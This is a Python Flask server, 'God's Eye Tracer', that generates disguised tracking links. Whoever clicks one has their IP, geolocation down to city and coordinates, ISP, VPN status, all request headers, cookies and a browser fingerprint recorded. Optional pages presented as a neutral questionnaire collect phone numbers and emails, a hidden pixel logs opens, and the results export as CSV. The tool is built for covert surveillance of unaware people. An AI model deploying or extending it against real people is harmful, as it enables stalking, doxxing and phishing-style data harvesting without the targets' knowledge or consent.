#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GET | God's Eye Tracer - Generatore di link tracciati, personalizzabili in ogni dettaglio.
Gira in locale e salva tutto in captures.json (accanto a questo file).

Avvio:
    python server.py                 -> http://127.0.0.1:8000
    python server.py 8000 0.0.0.0    -> raggiungibile dalla rete locale
"""

import csv
import io
import ipaddress
import json
import os
import re
import secrets
import sys
import time
import threading
from datetime import datetime, timezone, timedelta
from urllib.parse import unquote, urlsplit

import requests
from form_validation import validate_form
from flask import (Flask, Response, abort, g, jsonify, redirect, render_template,
                   request, send_file)

# --------------------------------------------------------------------------
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
BRAND_NAME = "GET | God's Eye Tracer"
DB_PATH = os.path.join(BASE_DIR, "captures.json")
STATIC_DIR = os.path.join(BASE_DIR, "static")
TZ = timezone(timedelta(hours=1))

app = Flask(__name__)
app.jinja_env.globals["brand_name"] = BRAND_NAME
_db_request_lock = threading.RLock()


@app.before_request
def serialize_database_requests():
    _db_request_lock.acquire()
    g.db_lock_acquired = True


@app.teardown_request
def release_database_lock(error=None):
    if g.pop('db_lock_acquired', False):
        _db_request_lock.release()

DEFAULT_PAGE = {
    "tab_title": "Questionario",
    "title": "Questionario",
    "subtitle": "Compila i campi richiesti per proseguire alla destinazione.",
    "button": "Continua",
    "footer": "",
    "logo_emoji": "",
    "logo_url": "",
    "accent": "#a78bfa",
    "bg": "#0b0b0e",
    "text": "#f2f0f7",
    "card": "#151419",
    "radius": "12px",
    "css": "",
    "lang": "it",
}

DEFAULT_FIELDS = [
    {"name": "telefono", "label": "Numero di telefono", "type": "tel",
     "required": False, "placeholder": "+39 333 0000000", "options": ""},
    {"name": "email", "label": "Indirizzo email", "type": "email",
     "required": False, "placeholder": "nome@esempio.com", "options": ""},
    {"name": "nome", "label": "Nome (opzionale)", "type": "text",
     "required": False, "placeholder": "Il tuo nome", "options": ""},
]

MODES = {
    "silent": "Redirect immediato (nessuna pagina: solo IP, geo, dispositivo)",
    "flash": "Pagina lampo con fingerprint completo, poi redirect automatico",
    "form": "Form di contatto (facoltativo) poi redirect",
    "strict": "Form di contatto obbligatorio poi redirect",
}

# --------------------------------------------------------------------------
# Persistenza
# --------------------------------------------------------------------------
def load_db():
    if not os.path.exists(DB_PATH):
        save_db({"links": {}, "captures": [], "settings": {}})
    with open(DB_PATH, "r", encoding="utf-8") as f:
        db = json.load(f)
    db.setdefault("links", {})
    db.setdefault("captures", [])
    db.setdefault("settings", {})
    # Stable identifiers also make legacy records individually deletable.
    seen, changed = set(), False
    for capture in db["captures"]:
        sid = capture.get("sid")
        if not isinstance(sid, str) or not sid or sid in seen:
            sid = secrets.token_hex(16)
            while sid in seen:
                sid = secrets.token_hex(16)
            capture["sid"] = sid
            changed = True
        seen.add(sid)
    if changed:
        save_db(db)
    return db


def save_db(db):
    tmp = DB_PATH + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    os.replace(tmp, DB_PATH)


# --------------------------------------------------------------------------
# Rete / geolocalizzazione (nessuna restrizione sugli IP privati)
# --------------------------------------------------------------------------
def is_private(ip):
    if not ip:
        return True
    ip = ip.replace("::ffff:", "").strip()
    try:
        a = ipaddress.ip_address(ip)
        return (a.is_private or a.is_loopback or a.is_link_local
                or a.is_reserved or a.is_unspecified)
    except ValueError:
        return True


_pub_cache = {"ip": None, "ts": 0}


def get_public_ip():
    """IP pubblico della connessione: usato per geolocalizzare anche gli IP privati."""
    now = time.time()
    if _pub_cache["ip"] and now - _pub_cache["ts"] < 1800:
        return _pub_cache["ip"]
    for url in ("https://api.ipify.org?format=json",
                "https://ipwho.is/?fields=ip",
                "http://ip-api.com/json/?fields=query"):
        try:
            r = requests.get(url, timeout=5)
            d = r.json()
            ip = d.get("ip") or d.get("query")
            if ip:
                _pub_cache["ip"] = ip
                _pub_cache["ts"] = now
                return ip
        except Exception:
            continue
    return None


_geo_cache = {}


def lookup_geo(ip):
    """Doppio provider gratuito: ip-api.com poi ipwho.is."""
    # 1) ip-api.com
    try:
        r = requests.get(
            "http://ip-api.com/json/{}?fields=status,country,regionName,city,"
            "zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile".format(ip),
            timeout=4)
        d = r.json()
        if d.get("status") == "success":
            return {
                "paese": d.get("country"), "regione": d.get("regionName"),
                "citta": d.get("city"), "cap": d.get("zip"),
                "latitudine": d.get("lat"), "longitudine": d.get("lon"),
                "fuso_orario": d.get("timezone"), "isp": d.get("isp"),
                "organizzazione": d.get("org"), "asn": d.get("as"),
                "vpn_proxy": d.get("proxy"), "hosting": d.get("hosting"),
                "mobile": d.get("mobile"), "provider": "ip-api.com",
            }
    except Exception:
        pass
    # 2) ipwho.is
    try:
        d = requests.get("https://ipwho.is/{}".format(ip), timeout=5).json()
        if d.get("success"):
            c = d.get("connection") or {}
            s = d.get("security") or {}
            return {
                "paese": d.get("country"), "regione": d.get("region"),
                "citta": d.get("city"), "cap": d.get("postal"),
                "latitudine": d.get("latitude"),
                "longitudine": d.get("longitude"),
                "fuso_orario": (d.get("timezone") or {}).get("id"),
                "isp": c.get("isp"), "organizzazione": c.get("org"),
                "asn": "AS{} {}".format(c.get("asn"), c.get("domain") or "").strip(),
                "vpn_proxy": s.get("proxy"), "hosting": s.get("hosting"),
                "mobile": None, "provider": "ipwho.is",
            }
    except Exception:
        pass
    return {}


def enrich_ip(ip):
    """Geolocalizza SEMPRE: se l'IP è privato usa l'IP pubblico della rete."""
    now = time.time()
    hit = _geo_cache.get(ip or "")
    if hit and now - hit[0] < 3600:
        return dict(hit[1])

    info = {"ip_ricevuto": ip, "tipo_ip": "pubblico"}
    target = ip
    if is_private(ip):
        info["tipo_ip"] = "privato/LAN"
        info["nota"] = "IP privato (rete locale, VPN o localhost)"
        pub = get_public_ip()
        if pub:
            info["ip_pubblico_rilevato"] = pub
            info["nota"] += (" - geolocalizzazione calcolata sull'IP pubblico "
                             "della rete ({})".format(pub))
            target = pub
    if target and not is_private(target):
        geo = lookup_geo(target)
        if geo:
            info.update(geo)
        else:
            info.setdefault("nota", "Geolocalizzazione non disponibile")
    _geo_cache[ip or ""] = (now, info)
    return dict(info)


# --------------------------------------------------------------------------
# Utility
# --------------------------------------------------------------------------
def now_local():
    return datetime.now(TZ).strftime("%d/%m/%Y %H:%M:%S")


def client_ip():
    for h in ("CF-Connecting-IP", "X-Real-IP", "X-Forwarded-For"):
        v = request.headers.get(h)
        if v:
            return v.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"


def clean_slug(s):
    s = (s or "").strip().lower()
    s = re.sub(r"[^a-z0-9_\-]+", "-", s)
    s = re.sub(r"-{2,}", "-", s).strip("-")
    return s


def normalize(link):
    """Completa un link con tutti i default (compatibile con i link vecchi)."""
    l = dict(link)
    if "mode" not in l:
        l["mode"] = ("strict" if l.get("require_form")
                     else "form" if l.get("ask_form") else "flash")
    page = dict(DEFAULT_PAGE)
    page.update(l.get("page") or {})
    # Upgrade only the old stock theme, preserving intentional customization.
    legacy_colors = {"accent": "#0969da", "bg": "#f6f8fa", "text": "#1f2328", "card": "#ffffff"}
    if all(page.get(key) == value for key, value in legacy_colors.items()):
        page.update({key: DEFAULT_PAGE[key] for key in legacy_colors})
    if page.get("tab_title") in ("Verifica in corso...", "Questionario | God's Eye Tracer"):
        page["tab_title"] = "Questionario"
    if page.get("title") == "Verifica di sicurezza":
        page["title"] = "Questionario"
    l["page"] = page
    fields = l.get("fields")
    if fields is None:
        fields = (DEFAULT_FIELDS if l["mode"] in ("form", "strict") else [])
    l["fields"] = fields
    l.setdefault("delay_ms", 350)
    l.setdefault("note", "")
    l.setdefault("clicks", 0)
    l.setdefault("creato", "")
    return l


def valid_http_url(value, base=False):
    """Validate absolute HTTP URLs; a public base must be an origin."""
    if not isinstance(value, str) or re.search(r"[\s\\\x00-\x1f\x7f]", value):
        return False
    try:
        parts = urlsplit(value)
        port = parts.port  # Also validates malformed/out-of-range ports.
        if (parts.scheme not in ("http", "https") or not parts.hostname
                or parts.username is not None or parts.password is not None):
            return False
        if base and (parts.path not in ("", "/") or "?" in value or "#" in value):
            return False
        return True
    except ValueError:
        return False


def public_base():
    runtime_base = app.config.get("PUBLIC_TUNNEL_URL")
    if runtime_base:
        return runtime_base
    db = load_db()
    base = (db["settings"].get("base_url") or "").strip()
    return base.rstrip("/") if valid_http_url(base, base=True) else request.host_url.rstrip("/")


def collect_snapshot():
    ua = request.headers.get("User-Agent", "")
    return {
        "timestamp": now_local(),
        "ip": client_ip(),
        "metodo": request.method,
        "pagina_richiesta": request.path,
        "lingua_browser": request.headers.get("Accept-Language", ""),
        "referrer": request.headers.get("Referer", "nessuno (accesso diretto)"),
        "user_agent": ua,
        "headers": {k: v for k, v in request.headers.items()},
        "cookies_ricevuti": request.cookies,
        "query_string": request.query_string.decode("utf-8", "replace"),
    }


def new_capture(slug, snap, via):
    return {
        "sid": secrets.token_hex(8),
        "id": slug,
        "timestamp": snap["timestamp"],
        "ip": snap["ip"],
        "geolocalizzazione": enrich_ip(snap["ip"]),
        "user_agent": snap["user_agent"],
        "lingua": snap["lingua_browser"],
        "referrer": snap["referrer"],
        "form_dati": {},
        "fingerprint_js": {},
        "rete": {},
        "headers": snap["headers"],
        "cookies": snap["cookies_ricevuti"],
        "query_string": snap["query_string"],
        "via": via,
    }


# --------------------------------------------------------------------------
# Rotte pubbliche
# --------------------------------------------------------------------------
@app.route("/")
def home():
    db = load_db()
    rows = []
    for slug, raw in db["links"].items():
        l = normalize(raw)
        rows.append({
            "slug": slug, "url": l["url"], "clicks": l["clicks"],
            "creato": l["creato"], "mode": l["mode"],
            "mode_label": l.get("mode", ""), "note": l.get("note", ""),
            "fields": len(l["fields"]),
            "captures": sum(1 for c in db["captures"] if c.get("id") == slug),
        })
    rows.sort(key=lambda r: r["creato"], reverse=True)
    return render_template("index.html", rows=rows, modes=MODES,
                           base=public_base(),
                           settings=db["settings"],
                           invalid_base=bool(db["settings"].get("base_url")) and
                           not valid_http_url(db["settings"]["base_url"].strip(), base=True))


@app.get("/logo.png")
def brand_logo():
    return send_file(os.path.join(app.root_path, app.template_folder, "logo", "logo_nobg.png"))


@app.route("/static/<path:filename>")
def static_files(filename):
    path = os.path.join(STATIC_DIR, filename)
    if not os.path.isfile(path):
        abort(404)
    return send_file(path)


@app.route("/new_link", methods=["POST"])
def new_link():
    data = request.get_json(force=True)
    url = (data.get("url") or "").strip()
    if not valid_http_url(url):
        return jsonify(ok=False, error="L'URL deve iniziare con http:// o https://"), 400
    slug = clean_slug(data.get("slug")) or secrets.token_hex(3)
    mode = data.get("mode") or "flash"
    if mode not in MODES:
        mode = "flash"

    db = load_db()
    if slug in db["links"]:
        return jsonify(ok=False, error="Questo ID esiste gia: scegline un altro"), 400

    db["links"][slug] = {
        "url": url,
        "mode": mode,
        "note": (data.get("note") or "").strip(),
        "page": dict(DEFAULT_PAGE),
        "fields": [dict(f) for f in DEFAULT_FIELDS] if mode in ("form", "strict") else [],
        "delay_ms": 350,
        "creato": now_local(),
        "clicks": 0,
    }
    save_db(db)
    return jsonify(ok=True, slug=slug,
                   link="{}/l/{}".format(public_base(), slug),
                   edit_url="/edit/{}".format(slug))


@app.route("/edit/<slug>")
def editor(slug):
    db = load_db()
    if slug not in db["links"]:
        abort(404)
    link = normalize(db["links"][slug])
    return render_template("editor.html", slug=slug, link=link, modes=MODES,
                           base=public_base())


@app.route("/l/<slug>")
def trace(slug):
    db = load_db()
    if slug not in db["links"]:
        abort(404)
    link = normalize(db["links"][slug])
    preview = request.args.get("preview") == "1"

    sid = ""
    if not preview:
        link["clicks"] = int(link.get("clicks", 0)) + 1
        db["links"][slug] = {**db["links"][slug], "clicks": link["clicks"]}
        snap = collect_snapshot()
        rec = new_capture(slug, snap, "click")
        sid = rec["sid"]
        db["captures"].append(rec)
        save_db(db)

    if link["mode"] == "silent" and not preview:
        return redirect(link["url"], code=302)

    return render_template(
        "gate.html", slug=slug, sid=sid, dest=link["url"],
        page=link["page"], fields=link["fields"], mode=link["mode"],
        delay=link.get("delay_ms", 350), preview=preview)


@app.route("/l/<slug>/pixel.png")
def pixel(slug):
    db = load_db()
    if slug in db["links"]:
        link = db["links"][slug]
        link["clicks"] = int(link.get("clicks", 0)) + 1
        db["captures"].append(new_capture(slug, collect_snapshot(), "pixel"))
        save_db(db)
    png = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00"
           b"\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\rIDATx\x9cc"
           b"\xfc\xff\xff?\x00\x05\xfe\x02\xfe\xa75\x81\x84\x00\x00\x00\x00IEND"
           b"\xaeB`\x82")
    return Response(png, mimetype="image/png",
                    headers={"Cache-Control": "no-store"})


def merge_capture(slug, sid, payload):
    """Aggiorna la cattura creata al click (per non avere righe duplicate)."""
    db = load_db()
    rec = None
    if sid:
        for c in reversed(db["captures"]):
            if c.get("id") == slug and c.get("sid") == sid:
                rec = c
                break
        # A late beacon must not recreate a record deleted by the owner.
        if rec is None:
            return
    if rec is None:
        rec = new_capture(slug, collect_snapshot(), "beacon")
        db["captures"].append(rec)
    if payload.get("form"):
        rec["form_dati"] = payload["form"]
    if "form_validation" in payload:
        rec["form_validation"] = payload["form_validation"]
    if payload.get("fp"):
        rec["fingerprint_js"] = payload["fp"]
    if payload.get("rete"):
        rec["rete"] = payload["rete"]
    rec["timestamp_fine"] = now_local()
    rec["via"] = "form" if payload.get("form") else "beacon"
    save_db(db)


@app.route("/collect/<slug>", methods=["POST"])
@app.route("/beacon/<slug>", methods=["POST"])
def collect(slug):
    data = request.get_json(silent=True) or {}
    if not isinstance(data, dict):
        return jsonify(ok=False, error="Richiesta non valida."), 400
    data.pop("form_validation", None)
    db = load_db()
    if slug not in db["links"]:
        abort(404)
    link = normalize(db["links"][slug])
    checks = {}
    if link["mode"] in ("form", "strict"):
        cleaned, checks, errors = validate_form(link["fields"], data.get("form", {}))
        if errors:
            return jsonify(ok=False, errors=errors, checks=checks), 422
        data["form"] = cleaned
        data["form_validation"] = checks
    merge_capture(slug, data.get("sid"), data)
    return jsonify(ok=True, checks=checks)


# --------------------------------------------------------------------------
# Gestione link (personalizzazione totale)
# --------------------------------------------------------------------------
@app.route("/api/link/<slug>", methods=["GET"])
def api_link(slug):
    db = load_db()
    if slug not in db["links"]:
        abort(404)
    return jsonify(normalize(db["links"][slug]))


@app.route("/edit/<slug>", methods=["POST"])
def save_link(slug):
    db = load_db()
    if slug not in db["links"]:
        return jsonify(ok=False, error="Link inesistente"), 404
    data = request.get_json(force=True) or {}

    new_slug = clean_slug(data.get("slug")) or slug
    url = (data.get("url") or "").strip()
    if not valid_http_url(url):
        return jsonify(ok=False, error="L'URL deve iniziare con http:// o https://"), 400
    if new_slug != slug and new_slug in db["links"]:
        return jsonify(ok=False, error="Quell'ID e gia usato da un altro link"), 400

    raw = db["links"][slug]
    raw["url"] = url
    raw["mode"] = data.get("mode") if data.get("mode") in MODES else raw.get("mode", "flash")
    raw["note"] = (data.get("note") or "").strip()
    page = dict(DEFAULT_PAGE)
    page.update(data.get("page") or {})
    raw["page"] = page
    raw["fields"] = [dict(f) for f in (data.get("fields") or [])]
    try:
        raw["delay_ms"] = max(0, min(5000, int(data.get("delay_ms") or 350)))
    except (TypeError, ValueError):
        raw["delay_ms"] = 350

    if new_slug != slug:
        db["links"] = {(new_slug if k == slug else k): v for k, v in db["links"].items()}
        for c in db["captures"]:
            if c.get("id") == slug:
                c["id"] = new_slug
    save_db(db)
    return jsonify(ok=True, slug=new_slug,
                   link="{}/l/{}".format(public_base(), new_slug))


@app.route("/delete/<slug>", methods=["POST"])
def delete_link(slug):
    db = load_db()
    if slug not in db["links"]:
        return jsonify(ok=False, error="Link non trovato."), 404
    data = request.get_json(silent=True) or {}
    if not isinstance(data, dict) or not isinstance(data.get("delete_captures", False), bool):
        return jsonify(ok=False, error="Richiesta non valida."), 400
    del db["links"][slug]
    if data.get("delete_captures"):
        db["captures"] = [c for c in db["captures"] if c.get("id") != slug]
    save_db(db)
    return jsonify(ok=True)


@app.route("/delete_capture/<sid>", methods=["POST"])
def delete_capture(sid):
    db = load_db()
    for index, capture in enumerate(db["captures"]):
        if capture.get("sid") == sid:
            del db["captures"][index]
            save_db(db)
            return jsonify(ok=True)
    return jsonify(ok=False, error="Cattura non trovata o già eliminata."), 404


@app.route("/duplicate/<slug>", methods=["POST"])
def duplicate_link(slug):
    db = load_db()
    if slug not in db["links"]:
        abort(404)
    base = "{}-copia".format(slug)
    new_slug = base
    i = 2
    while new_slug in db["links"]:
        new_slug = "{}{}".format(base, i)
        i += 1
    raw = dict(db["links"][slug])
    raw["creato"] = now_local()
    raw["clicks"] = 0
    db["links"][new_slug] = raw
    save_db(db)
    return jsonify(ok=True, slug=new_slug,
                   edit_url="/edit/{}".format(new_slug))


@app.route("/settings", methods=["POST"])
def save_settings():
    db = load_db()
    data = request.get_json(force=True) or {}
    base = (data.get("base_url") or "").strip()
    if base and not valid_http_url(base, base=True):
        return jsonify(ok=False, error=("Inserisci l'indirizzo completo del server "
                       "(es. https://test.tuodominio.it), senza percorsi, query o frammenti. "
                       "Lascia vuoto per usare l'indirizzo corrente.")), 400
    db["settings"]["base_url"] = base.rstrip("/")
    save_db(db)
    return jsonify(ok=True, base=public_base())


# --------------------------------------------------------------------------
# Dati catturati
# --------------------------------------------------------------------------
@app.route("/captures")
def captures():
    db = load_db()
    rows = []
    for c in db["captures"]:
        c = dict(c)
        c["link"] = c.get("id")
        rows.append(c)
    rows.reverse()
    return render_template("captures.html", captures=rows, links=db["links"])


@app.route("/api/captures")
def api_captures():
    return jsonify(load_db()["captures"])


@app.route("/api/links")
def api_links():
    db = load_db()
    return jsonify({k: normalize(v) for k, v in db["links"].items()})


@app.route("/export/csv")
def export_csv():
    db = load_db()
    si = io.StringIO()
    w = csv.writer(si)
    w.writerow(["id_link", "timestamp", "ip", "tipo_ip", "paese", "regione",
                "citta", "isp", "lat", "lon", "ip_pubblico_rilevato",
                "user_agent", "lingua", "referrer", "via", "rete",
                "form_dati", "fingerprint", "query_string"])
    for c in db["captures"]:
        g = c.get("geolocalizzazione") or {}
        w.writerow([
            c.get("id"), c.get("timestamp"), c.get("ip"), g.get("tipo_ip"),
            g.get("paese"), g.get("regione"), g.get("citta"), g.get("isp"),
            g.get("latitudine"), g.get("longitudine"),
            g.get("ip_pubblico_rilevato"), c.get("user_agent"),
            c.get("lingua"), c.get("referrer"), c.get("via"),
            json.dumps(c.get("rete") or {}, ensure_ascii=False),
            json.dumps(c.get("form_dati") or {}, ensure_ascii=False),
            json.dumps(c.get("fingerprint_js") or {}, ensure_ascii=False),
            c.get("query_string", ""),
        ])
    return Response(si.getvalue(), mimetype="text/csv",
                    headers={"Content-Disposition":
                             "attachment; filename=get_captures.csv"})


# --------------------------------------------------------------------------
if __name__ == "__main__":
    load_db()
    port, host = 8000, "127.0.0.1"
    args = sys.argv[1:]
    if args:
        port = int(args[0])
    if len(args) > 1:
        host = args[1]
    print("=" * 62)
    print(f"  {BRAND_NAME} avviato")
    print("  Pannello:  http://127.0.0.1:{}/".format(port))
    print("  Dati:      {}".format(DB_PATH))
    print("  IP pubblico della rete: {}".format(get_public_ip() or "non rilevato"))
    print("=" * 62)
    app.run(host=host, port=port, debug=False, threaded=True)
